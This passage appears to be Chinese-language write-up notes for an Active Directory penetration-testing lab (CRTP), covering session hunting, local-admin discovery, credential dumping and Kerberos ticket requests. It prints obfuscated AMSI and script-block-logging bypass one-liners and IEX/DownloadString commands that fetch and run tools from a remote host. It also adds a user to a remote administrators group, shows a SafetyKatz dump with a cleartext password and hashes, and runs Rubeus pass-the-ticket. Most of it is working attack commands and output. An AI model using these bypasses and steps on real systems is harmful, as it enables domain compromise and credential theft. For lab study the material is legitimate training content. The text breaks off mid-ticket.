<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full</span><br><span class="line">The name has already been shared.</span><br><span class="line"></span><br><span class="line">More help is available by typing NET HELPMSG 2118.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;icacls &quot;C:\AD\Tools\stdx-gp&quot; /grant Everyone:F /T</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\gpt.ini</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\User</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\comment.cmtx</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Microsoft</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Preferences</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Registry.pol</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Scripts</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Microsoft\Windows NT</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Microsoft\Windows NT\SecEdit</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Preferences\ScheduledTasks</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Scripts\Shutdown</span><br><span class="line">processed file: C:\AD\Tools\stdx-gp\Machine\Scripts\Startup</span><br><span class="line">Successfully processed 16 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>手动刷新组策略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate </span><br></pre></td></tr></table></figure>

<p>或者等会再查看，就能看到当前用户通过组策略（GPO） 添加到了dcorp-ci的本地administrator组内。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-25.png" alt="alt text"></p>
<p>这里flag填修改的GPO的属性 <code>gpcfilesyspath</code></p>
<h2 id="Learning-Objective-7-1"><a href="#Learning-Objective-7-1" class="headerlink" title="Learning Objective - 7 - 1"></a>Learning Objective - 7 - 1</h2><blockquote>
<p>Process using svcadmin as service account</p>
</blockquote>
<blockquote>
<p>使用<code>svcadmin</code> 账户运行的的服务名</p>
</blockquote>
<p>先得知道这个b账户都在哪台机器，所以跑 <code>Invoke-SessionHunter.ps1</code> 看下在哪些机器上有session，这个好处是在目标机器上没有本地管理员权限也能用..</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; . .\<span class="built_in">Invoke-SessionHunter</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Invoke-SessionHunter</span> <span class="literal">-NoPortScan</span> <span class="literal">-RawResults</span>|<span class="built_in">select</span> hostname , usersession ,access ,admcount</span><br><span class="line"></span><br><span class="line">[+] Elapsed time: <span class="number">0</span>:<span class="number">0</span>:<span class="number">2.672</span></span><br><span class="line"></span><br><span class="line">HostName       UserSession                Access AdmCount</span><br><span class="line"><span class="literal">--------</span>       <span class="literal">-----------</span>                <span class="literal">------</span> <span class="literal">--------</span></span><br><span class="line">dcorp<span class="literal">-appsrv</span>   dcorp\appadmin              False    False</span><br><span class="line">dcorp<span class="literal">-mgmt</span>     dcorp\mgmtadmin             False    False</span><br><span class="line">dcorp<span class="literal">-mssql</span>    dcorp\sqladmin              False    False</span><br><span class="line">dcorp<span class="literal">-sql1</span>     dcorp\sql1admin             False    False</span><br><span class="line">dcorp<span class="literal">-std521</span>   dcorp\student521            False    False</span><br><span class="line">dcorp<span class="literal">-std523</span>   dcorp\student523            False    False</span><br><span class="line">dcorp<span class="literal">-std524</span>   dcorp\student524            False    False</span><br><span class="line">dcorp<span class="literal">-std525</span>   dcorp\student525            False    False</span><br><span class="line">dcorp<span class="literal">-std526</span>   dcorp\student526            False    False</span><br><span class="line">dcorp<span class="literal">-std527</span>   dcorp\student527            False    False</span><br><span class="line">dcorp<span class="literal">-std528</span>   dcorp\student528            False    False</span><br><span class="line">dcorp<span class="literal">-std529</span>   dcorp\student529            False    False</span><br><span class="line">dcorp<span class="literal">-std530</span>   dcorp\student530            False    False</span><br><span class="line">dcorp<span class="literal">-std531</span>   dcorp\student531            False    False</span><br><span class="line">dcorp<span class="literal">-std532</span>   dcorp\student532            False    False</span><br><span class="line">dcorp<span class="literal">-std533</span>   dcorp\student533            False    False</span><br><span class="line">dcorp<span class="literal">-std534</span>   dcorp\student534            False    False</span><br><span class="line">dcorp<span class="literal">-std535</span>   dcorp\student535            False    False</span><br><span class="line">dcorp<span class="literal">-std536</span>   dcorp\student536            False    False</span><br><span class="line">dcorp<span class="literal">-std537</span>   dcorp\student537            False    False</span><br><span class="line">dcorp<span class="literal">-std538</span>   dcorp\student538            False    False</span><br><span class="line">dcorp<span class="literal">-std539</span>   dcorp\student539            False    False</span><br><span class="line">dcorp<span class="literal">-std540</span>   dcorp\student540            False    False</span><br><span class="line">dcorp<span class="literal">-stdadmin</span> dcorp\studentadmin          False    False</span><br><span class="line">dcorp<span class="literal">-dc</span>       dcorp\Administrator         False     True</span><br><span class="line">dcorp<span class="literal">-mgmt</span>     dcorp\svcadmin              False     True</span><br><span class="line">dcorp<span class="literal">-stdadmin</span> DCORP<span class="literal">-STD522</span>\Administrator  False     True</span><br><span class="line">us<span class="literal">-dc</span>          US\Administrator            False     True</span><br><span class="line">dcorp<span class="literal">-adminsrv</span> dcorp\appadmin               True    False</span><br><span class="line">dcorp<span class="literal">-adminsrv</span> dcorp\srvadmin               True    False</span><br><span class="line">dcorp<span class="literal">-adminsrv</span> dcorp\websvc                 True    False</span><br><span class="line">dcorp<span class="literal">-ci</span>       dcorp\ciadmin                True    False</span><br><span class="line">dcorp<span class="literal">-ci</span>       dcorp\devopsadmin            True    False</span><br></pre></td></tr></table></figure>

<p>能看到 <code>dcorp\svcadmin</code> 在 <code>dcorp-mgmt</code> 机器上有session,而且 <code>svcadmin</code> 还是域管(DA)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcorp-mgmt     dcorp\svcadmin              False     True</span><br></pre></td></tr></table></figure>

<p>但是没鸟用</p>
<p>目前手里比较新的用户是 在dcorp-ci上的<code>ciadmin</code>用户 ， 枚举一下他在其他机器上是否有本地管理员。</p>
<p>用powerview的 <code>Find-LocalAdminaccess</code>，但是dcorp-ci机器上有amsi需要绕一下</p>
<p>好处是阿三已经给准备了一个 <code>sbloggingbypass.txt</code> bypass log记录的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Reflection.Assembly]::&quot;l`o`AdwIThPa`Rti`AlnamE&quot;((&#x27;S&#x27;+&#x27;ystem&#x27;+&#x27;.C&#x27;+&#x27;ore&#x27;)).&quot;g`E`TTYPE&quot;((&#x27;Sys&#x27;+&#x27;tem.Di&#x27;+&#x27;agno&#x27;+&#x27;stics.Event&#x27;+&#x27;i&#x27;+&#x27;ng.EventProv&#x27;+&#x27;i&#x27;+&#x27;der&#x27;)).&quot;gET`FI`eLd&quot;((&#x27;m&#x27;+&#x27;_&#x27;+&#x27;enabled&#x27;),(&#x27;NonP&#x27;+&#x27;ubl&#x27;+&#x27;ic&#x27;+&#x27;,Instance&#x27;)).&quot;seTVa`l`Ue&quot;([Ref].&quot;a`sSem`BlY&quot;.&quot;gE`T`TyPE&quot;((&#x27;Sys&#x27;+&#x27;tem&#x27;+&#x27;.Mana&#x27;+&#x27;ge&#x27;+&#x27;ment.Aut&#x27;+&#x27;o&#x27;+&#x27;mation.Tracing.&#x27;+&#x27;PSEtwLo&#x27;+&#x27;g&#x27;+&#x27;Pro&#x27;+&#x27;vi&#x27;+&#x27;der&#x27;)).&quot;gEtFIe`Ld&quot;((&#x27;e&#x27;+&#x27;tw&#x27;+&#x27;Provid&#x27;+&#x27;er&#x27;),(&#x27;N&#x27;+&#x27;o&#x27;+&#x27;nPu&#x27;+&#x27;b&#x27;+&#x27;lic,Static&#x27;)).&quot;gE`Tva`lUe&quot;($null),0)</span><br></pre></td></tr></table></figure>

<p>直接在 <code>dcorp-ci</code>上执行就完事</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; IEX(IWR 172.16.100.22:8080/sbloggingbypass.txt -UseBasicParsing)</span><br></pre></td></tr></table></figure>

<p>然后是amsi用的下面这段</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; S`eT<span class="literal">-It</span>`em ( <span class="string">&#x27;V&#x27;</span>+<span class="string">&#x27;aR&#x27;</span> +  <span class="string">&#x27;IA&#x27;</span> + ((<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;blE:&#x27;</span>)+<span class="string">&#x27;q2&#x27;</span>)  + (<span class="string">&#x27;uZ&#x27;</span>+<span class="string">&#x27;x&#x27;</span>)  ) ( [<span class="type">TYpE</span>](  <span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-F</span><span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;rE&#x27;</span>  ) )  ;    (    <span class="built_in">Get-varI</span>`A`BLE  ( (<span class="string">&#x27;1Q&#x27;</span>+<span class="string">&#x27;2U&#x27;</span>)  +<span class="string">&#x27;zX&#x27;</span>  )  <span class="literal">-VaL</span>  ).<span class="string">&quot;A`ss`Embly&quot;</span>.<span class="string">&quot;GET`TY`Pe&quot;</span>((  <span class="string">&quot;&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span>(<span class="string">&#x27;Uti&#x27;</span>+<span class="string">&#x27;l&#x27;</span>),<span class="string">&#x27;A&#x27;</span>,(<span class="string">&#x27;Am&#x27;</span>+<span class="string">&#x27;si&#x27;</span>),((<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;.M&#x27;</span>,<span class="string">&#x27;an&#x27;</span>)+<span class="string">&#x27;age&#x27;</span>+<span class="string">&#x27;men&#x27;</span>+<span class="string">&#x27;t.&#x27;</span>),(<span class="string">&#x27;u&#x27;</span>+<span class="string">&#x27;to&#x27;</span>+(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ma&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;tion&#x27;</span>)),<span class="string">&#x27;s&#x27;</span>,((<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;Sys&#x27;</span>)+<span class="string">&#x27;em&#x27;</span>)  ) ).<span class="string">&quot;g`etf`iElD&quot;</span>(  ( <span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span>(<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;msi&#x27;</span>),<span class="string">&#x27;d&#x27;</span>,(<span class="string">&#x27;I&#x27;</span>+(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ni&#x27;</span>,<span class="string">&#x27;tF&#x27;</span>)+(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ile&#x27;</span>,<span class="string">&#x27;a&#x27;</span>))  ),(  <span class="string">&quot;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&#x27;S&#x27;</span>+<span class="string">&#x27;tat&#x27;</span>),<span class="string">&#x27;i&#x27;</span>,(<span class="string">&#x27;Non&#x27;</span>+(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ubl&#x27;</span>,<span class="string">&#x27;P&#x27;</span>)+<span class="string">&#x27;i&#x27;</span>),<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c,&#x27;</span>  )).<span class="string">&quot;sE`T`VaLUE&quot;</span>(  <span class="variable">$</span>&#123;n`ULl&#125;,<span class="variable">$</span>&#123;t`RuE&#125; )</span><br></pre></td></tr></table></figure>

<p>amsi扬掉之后就加载powerview查一下当前<code>ciadmin</code>账户在那台机器上有本地管理员。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">iex</span> ((<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://172.16.100.22:8080/PowerView.ps1&#x27;</span>))</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">dcorp<span class="literal">-ci</span>.dollarcorp.moneycorp.local</span><br><span class="line">dcorp<span class="literal">-mgmt</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>除了 <code>dcorp-ci</code> 他在 <code>dcorp-mgmt</code> 有本地管理员。</p>
<p>因为没有交互式所以只能单条执行，但是我也懒得弹shell，还是给当前 <code>student522</code> 用户加个localadmin好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\.jenkins\workspace\Project0&gt;  invoke-command -computer dcorp-mgmt -scriptblock &#123;cmd /c net localgroup administrators dcorp\student522 /add&#125;</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>然后就可以远程过去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\student522&gt; winrs -r:dcorp-mgmt powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line">PS C:\Users\student522&gt; ls</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\student522</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Desktop</span><br><span class="line">d-r---         5/24/2025   5:37 AM                Documents</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Downloads</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Favorites</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Links</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Music</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Pictures</span><br><span class="line">d-----          5/8/2021   1:15 AM                Saved Games</span><br><span class="line">d-r---          5/8/2021   1:15 AM                Videos</span><br><span class="line"></span><br><span class="line">PS C:\Users\student522&gt;</span><br></pre></td></tr></table></figure>

<p>列出当前机器上正在运行的服务和服务账户，我筛了一下 <code>svcadmin</code> 以及正在运行的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\student522&gt; Get-WmiObject Win32_Service |?&#123;$_.state -eq &quot;Running&quot; -and $_.startname -match &quot;svcadmin&quot;&#125;|Select-Object Name, StartName, State</span><br><span class="line">Get-WmiObject Win32_Service |?&#123;$_.state -eq &quot;Running&quot; -and $_.startname -match &quot;svcadmin&quot;&#125;|Select-Object Name, StartName, State</span><br><span class="line"></span><br><span class="line">Name        StartName      State</span><br><span class="line">----        ---------      -----</span><br><span class="line">MSSQLSERVER dcorp\svcadmin Running</span><br></pre></td></tr></table></figure>

<p>这里就得到了flag <code>MSSQLSERVER</code>，然后既然本地跑着域管账户那就可以导一下hash了，mimikatz直接落地有点难崩，所以用加载器。</p>
<h2 id="Learning-Objective-7-2"><a href="#Learning-Objective-7-2" class="headerlink" title="Learning Objective - 7 - 2"></a>Learning Objective - 7 - 2</h2><blockquote>
<p>NTLM hash of svcadmin account</p>
</blockquote>
<blockquote>
<p>svcadmin账户的hash</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522\desktop&gt; <span class="built_in">curl</span> <span class="number">172.16</span>.<span class="number">100.22</span>:<span class="number">8080</span>/loader.exe <span class="literal">-o</span> loader.exe</span><br><span class="line"><span class="built_in">curl</span> <span class="number">172.16</span>.<span class="number">100.22</span>:<span class="number">8080</span>/loader.exe <span class="literal">-o</span> loader.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\student522\desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\student522\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">5</span>/<span class="number">24</span>/<span class="number">2025</span>   <span class="number">5</span>:<span class="number">54</span> AM         <span class="number">110592</span> loader.exe</span><br></pre></td></tr></table></figure>

<p>然后加载safetykatz导出本机的所有账户凭证（x</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe <span class="literal">-path</span> http://<span class="number">172.16</span>.<span class="number">100.22</span>:<span class="number">8080</span>/safetykatz.exe <span class="string">&quot;sekurlsa::evasive-keys&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">117405</span> (<span class="number">00000000</span>:<span class="number">0001</span>ca9d)</span><br><span class="line">Session           : Service from <span class="number">0</span></span><br><span class="line">User Name         : svcadmin</span><br><span class="line">Domain            : dcorp</span><br><span class="line">Logon Server      : DCORP<span class="literal">-DC</span></span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">16</span>/<span class="number">2025</span> <span class="number">11</span>:<span class="number">18</span>:<span class="number">57</span> PM</span><br><span class="line">SID               : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1118</span></span><br><span class="line"></span><br><span class="line">         * Username : svcadmin</span><br><span class="line">         * Domain   : DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">         * Password : *ThisisBlasphemyThisisMadness!!</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">6366243</span>a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><br><span class="line">           aes128_hmac       <span class="number">8</span>c0a8695795df6c9a85c4fb588ad6cbd</span><br><span class="line">           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8</span><br><span class="line">           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8</span><br><span class="line">           rc4_md4           b38ff50264b74508085d82c69794a4d8</span><br><span class="line">           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8</span><br><span class="line">           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8</span><br></pre></td></tr></table></figure>

<p>得到svcadmin的密码和key等</p>
<p>所以这里flag为 <code>b38ff50264b74508085d82c69794a4d8</code></p>
<p>回自己机器，拿 <code>svcadmin</code> 的aeskey请求tgt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\Loader.exe <span class="literal">-path</span>  .\Rubeus.exe <span class="literal">-args</span> asktgt  /user:svcadmin /aes256:<span class="number">6366243</span>a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:<span class="number">6366243</span>a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /ptt</span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Got domain: dollarcorp.moneycorp.local</span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)</span><br><span class="line">[!] Pre<span class="literal">-Authentication</span> required!</span><br><span class="line">[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin</span><br><span class="line">[*] <span class="keyword">Using</span> aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;dollarcorp.moneycorp.local\svcadmin&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.2.1:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGAjCCBf6gAwIBBaEDAgEWooIE2TCCBNVhggTRMIIEzaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC</span><br><span class="line">      BHUwggRxoAMCARKhAwIBAqKCBGMEggRfSKf5neV8xIjuMB7/F0I2m5q4iQhjeqBHNTm6ssdq5fNa3jlI</span><br><span class="line">      qEnqY593RJTicyxY3ghT6ROjlFSeadx0r4g/+SaX6WsPE3/ewKpa/JtUkxCCa7CneirV4FcFXZQ70Jsi</span><br><span class="line">      <span class="number">017</span>BM4ceI+dSl31GSBSBcsNpGeLwFblO/tZhFYjzd1NGHuKOriRxVLMedSYLqkCwpedsSCJEsne2z5IY</span><br><span class="line">      Fy5xy4iVYMwaAjys5U04NXTtX6le822uIdbvdUmcGCoJq1QMxaay2cWegRJ73x7z50HpAE/kSkR/elld</span><br><span class="line">      FbFBTUL3mVo3wP3AN92NAmzR1SUpfPIK5pf2VAcgOS57Qy45oBWsSgI2Ty1QONHD14By3A7L+QdbuRnb</span><br><span class="line">      fkQAv1/<span class="number">2</span>BJqG2vRWmJpKJa5Y7kCI3suJJ1b20YDh1qxsxbtRGOURU5tBAPipoMc+<span class="number">2</span>bFtFQ/qpuEJrdJK</span><br><span class="line">      O4OwWiFaNx/px6In57Mu4W0PwqPkJ+Z74bfwtANKMf0pLuwqT5c7aSVwWWDR4k6IhjphqaGPPTqTEbZZ</span><br><span class="line">      <span class="number">1</span>+FcQh39ge+<span class="number">0</span>qyotKiPaPhvOuXir0N2NjV/<span class="number">1</span>oC3hVJxmQNrls3dfvfaFA23MRy/E1SyiTi8lhFTNSVpk</span><br><span class="line">      yLY8XGRW/KZ1RHbsNGLIcPiPtM+uwym2U1LHapgsjxXUAGsbUo2kJICKoCzC4riHNaxkNhxmMiJwuWgr</span><br><span class="line">      faXCv34hnExiVfMNnlK4pLp2JD7ZWKD+OcPoLUyIgYOmevCXlSjD96ai5xghH4+x7WKNp35OToVe2jLu</span><br><span class="line">      /sux6ZO6HCWrQsCeq4LxRRNnKPiKOhC4V5RJIyBkRX/yf+sUcMlkU62UcNtHqv5l95uvr5JjH41LkwF5</span><br><span class="line">      <span class="number">7</span>hfcWX378RO5QtLEouXDUZgzYiX8FmACk8JcHTS0AQU8B5BsHPWu11EG4nlEqVGOOJn424NGarSIe4Wm</span><br><span class="line">      cgwiFRdQHsjstsyEzxkG08PnylMr49vsvi+BWGbr6CQY/EO77ld49W6Lk/<span class="number">5</span>YpSrN/d2T4H1dDack4KVv</span><br><span class="line">      ud+dXrVZFje2URuKL/aCc35+<span class="number">7</span>gIjmYjOR1sYY8SjqwOudlYLxjGvuXe6WPcyv1zkchnPbEcf+qHYfkmA</span><br><span class="line">      pW74hZNGimBRWo/UhtzjcLF4rZnORLSiGyWh+JUq8AZAenuLCpRBRh0gJ5y1IlrpLzMFz6Reb89R2CEw</span><br><span class="line">      uuwF4VzC3E5fYnGElfp36D3Iqm+pqEjAI1lZ4zynVXAfINZath/GyIBTbI9QLftTp5iYq1jD/B+<span class="number">5</span>Dgnm</span><br><span class="line">      X7XlivAG1ymdUE42K4TV0M6Rf2kQNUQVswPEpN3ko9YA/VlP0023KdMc47HnI+kW7tkfIlq9odCSkzZt</span><br><span class="line">      fyc3MvOBWmoo6L+Kv01bIbSt0X6pmDZT+y3/gEaxVbY4nJqadWIuw9dBthekqNETAQG74UpzmT2FRinm</span><br><span class="line">      <span 